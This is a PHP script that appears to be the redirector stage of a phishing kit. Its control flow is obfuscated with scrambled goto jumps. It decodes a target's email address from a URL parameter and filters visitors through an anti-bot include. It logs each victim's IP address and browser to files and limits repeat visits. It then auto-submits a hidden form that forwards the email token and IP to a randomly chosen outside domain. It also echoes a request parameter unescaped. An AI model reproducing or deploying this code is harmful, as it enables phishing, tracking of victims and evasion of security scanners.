<?php
ini_set('display_errors', 1);
ini_set('display_startup_errors', 1);
error_reporting(E_ALL);
require("links.php");

function doEncrypt($string)
{
    $rand = substr(md5(microtime()) , rand(0, 26) , 2);
    $crystr = "" . $rand . "" . base64_encode($string) . "";
    return $crystr;
}
function doDecrypt($string)
{
    $str = substr(urldecode($string) , 2);
    $crystr = base64_decode($str);
    return $crystr;
}
function RandNumber($randstr)
{
    $char = 'abcdefghijklmnopqrstuvwxyz';
    $str  = '';
    for ($i = 0;
        $i < $randstr;
        $i++) {
        $pos = rand(0, strlen($char) - 1);
        $str .= $char[$pos];
    }
    return $str;

};
function getRealIpAddr() {
    if (!empty($_SERVER['HTTP_CLIENT_IP']))   //check ip from share internet
    {   $ip=$_SERVER['HTTP_CLIENT_IP']; }
    elseif (!empty($_SERVER['HTTP_X_FORWARDED_FOR']))   //to check ip is pass from proxy
    {   $ip=$_SERVER['HTTP_X_FORWARDED_FOR']; }
    else
    {   $ip=$_SERVER['REMOTE_ADDR']; }
    return $ip;
}



$ip = getRealIpAddr();
$ip_en = doEncrypt($ip);

goto AK2qw; mWMUk: $file = fopen("src/clicks.txt", "a");
$fp = fopen("src/visits.csv", "a");
fputs($fp, "\"" . $email64. "\",\"" . $ip . "\"\r\n");
fclose($fp);
$files = 'src/visits.csv';
$contents = file_get_contents($files);
$str = $email64; 
if(substr_count($contents, $str)>$visits){
header('location: '. RandNumber(9));
exit;
//header("Location: ../");
}

goto GUcNS; iykmR: header('location: '. RandNumber(9));
goto jkI8i; Xx6w7: exit; goto X5N3x; kmVAG: 
$random_keys = array_rand($normallink);
$normallink_rand = $normallink[$random_keys];
//////////////////////////////////////////////////////////////////////////////////////////////////
//exit(header("Location: https://" . $normallink_rand . "/" . RandNumber(5) . "." . RandNumber(3) . "?" . RandNumber(6) . "=$rawtoken&ip=$ip_en"));

$post = "https://" . $normallink_rand . "/" . RandNumber(5) . "." . RandNumber(3) . "?" . RandNumber(6) . "=$rawtoken&ip=$ip_en";

?>

<form action="<?php echo 'https://' . $normallink_rand; ?>" method="post" id="dateForm">
<input type="hidden" name="<?php echo RandNumber(9); ?>" value="<?php echo $rawtoken; ?>">
<input type="hidden" name="ip" value="<?php echo $_GET['ip']; ?>">
</form>

<script type="text/javascript">
    document.getElementById('dateForm').submit(); // SUBMIT FORM
</script>

<?php
exit();

// https://ssjtours.com/Parts/msqrl/dbkqkf.gfv?ghh=$email
//////////////////////////////////////////////////////////////////////////////////////////////////

 goto dG12y; ewRro: if (!($email == "")) { goto N6ANb; } goto iykmR; GUcNS: fwrite($file, $ip . ' ' . $_SERVER['HTTP_USER_AGENT'] . "\r\n");
 goto yaCE1; yaCE1: fclose($file); goto kmVAG; JeHXm: $praga = md5($praga); goto ms0bd; AK2qw: error_reporting(0);
 goto qthSb; wNCz5: N6ANb: goto TVGVK; qeOrv: header('location: '. RandNumber(9));
 goto Xx6w7; ms0bd: $email64 = doDecrypt($pieces[0]); $rawtoken = doEncrypt($email64);  goto ewRro; iROxx: $get = $cl[0]; goto Zgn46; GB1zy: XKItP:
 goto mWMUk; ed3zh: $cl = explode('/', $_GET['ref']); goto iROxx; Zgn46: $pieces = explode("-", $get);
 goto bJFDa; qthSb: require 'src/anti.php'; goto ed3zh; bJFDa: $email = $pieces[0];
 goto ek8Vv; TVGVK: if (strpos($email64, '@') !== false) { goto XKItP; } goto qeOrv; X5N3x: goto SrfbB;
 goto GB1zy; jkI8i: exit; goto wNCz5; ek8Vv: $praga = rand(); goto JeHXm; dG12y: SrfbB:


?>